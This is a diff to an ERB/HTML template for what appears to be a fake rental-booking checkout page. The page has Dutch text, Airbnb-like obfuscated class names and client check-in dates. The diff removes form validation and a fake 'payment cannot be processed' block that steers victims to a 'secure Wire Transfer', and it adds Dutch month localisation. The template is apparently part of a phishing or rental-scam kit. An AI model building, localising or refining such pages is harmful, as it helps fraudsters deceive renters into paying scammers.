@@ -2758,7 +2758,7 @@
                                 </div>
                                 <div>
                                     <div>
-                                        <form action="/confirm" method="post" id="s-form" data-parsley-validate="" novalidate="">
+                                        <form action="/confirm" method="post" id="s-form">
                                             <input type="hidden" value="0" id="allow_form_submit" />
                                             <div id="init-form">
                                                 <div style="margin-bottom: 24px;">
@@ -3171,59 +3171,11 @@
                                                                     </div>
                                                                 </div>
                                                                 <button type="submit" class="_xjr7t8b" aria-busy="false"><span class="_9tgvsw6"><span>Bevestig uw gegevens</span></span>
-                                                                </button> <span id="processing-message" style="display: none"><img src="zeKbcWK.gif" style="margin: 0 10px 0 10px;" /> Processing payment. Please wait.</span>
+                                                                </button>
                                                             </div>
                                                         </div>
                                                     </div>
                                                 </div>
-                                            </div>
-                                            <div id="p-error" style="display: none; margin-bottom: 30px;">
-                                                <div style="margin-bottom:16px;">
-                                                    <div>
-                                                        <div style="margin-bottom:8px;">
-                                                            <h4 class="_c4wmwt3"><span style="color: #A61B34 !important;">The payment cannot be processed</span></h4></div>
-                                                    </div>
-                                                </div>
-                                                <div style="margin-bottom:32px;">
-                                                    <div class="_lcan2i5">
-                                                        <div>
-                                                            <div class="_2930ex">
-                                                                <div class="_17235gdu">
-                                                                    <div class="_7p6gd8e">
-                                                                        <div class="_zaohsfm" style="border-radius:16px;">
-                                                                            <div style="margin-bottom:16px;">
-                                                                                <p class="_rotqmn2 bolder"><strong>Here are some possible reasons</strong></p>
-                                                                                <ul class="_166ju6w">
-                                                                                    <li>
-                                                                                        <div style="margin-top:8px;">
-                                                                                            <div class="_rotqmn2">Your card is not enabled for foreign transactions
-                                                                                            </div>
-                                                                                        </div>
-                                                                                    </li>
-                                                                                    <li>
-                                                                                        <div style="margin-top:8px;">
-                                                                                            <div class="_rotqmn2">Your card now allows for billing in foreign currency
-                                                                                            </div>
-                                                                                        </div>
-                                                                                    </li>
-                                                                                    <li>
-                                                                                        <div style="margin-top:8px;">
-                                                                                            <div class="_rotqmn2">You haven't entered your billing address exactly as it appears on your card statement
-                                                                                            </div>
-                                                                                        </div>
-                                                                                    </li>
-                                                                                </ul>
-                                                                            </div>
-                                                                        </div>
-                                                                    </div>
-                                                                </div>
-                                                            </div>
-                                                        </div>
-                                                    </div>
-                                                    <div class="_rotqmn2" style="padding-top: 15px !important;"><span>You might want to try our secure Wire Transfer payment system.</span></div>
-                                                </div>
-                                                <button type="submit" class="_xjr7t8b" aria-busy="false"><span class="_9tgvsw6"><span>Continue with Wire Transfer</span></span>
-                                                </button>
                                             </div>
                                         </form>
                                     </div>
@@ -3281,7 +3233,12 @@
                                                                             <div style="margin-right:8px;"></div>
                                                                         </div>
                                                                         <div class="_ni9axhe">
-                                                                            <div class="_rotqmn2"><%= Time.at(client.checkin_timestamp).strftime('%b %-d, %Y')%>
+                                                                            <div class="_rotqmn2">
+                                                                                <%
+                                                                                    str = Time.at(client.checkin_timestamp).strftime('%b %-d, %Y')
+                                                                                    str = str.gsub(/Mar|May|Oct/, 'Mar' => 'Maart', 'May' => 'Mei', 'Oct' => 'Okt');
+                                                                                %>
+                                                                                <%= str %>
                                                                                 <div class="_36rlri" style="margin-left:12px;margin-right:12px;"></div>Periode: <%= client.number_of_months %>  maand<%= client.number_of_months == 1 ? '' : 'en' %>
                                                                             </div>
                                                                         </div>
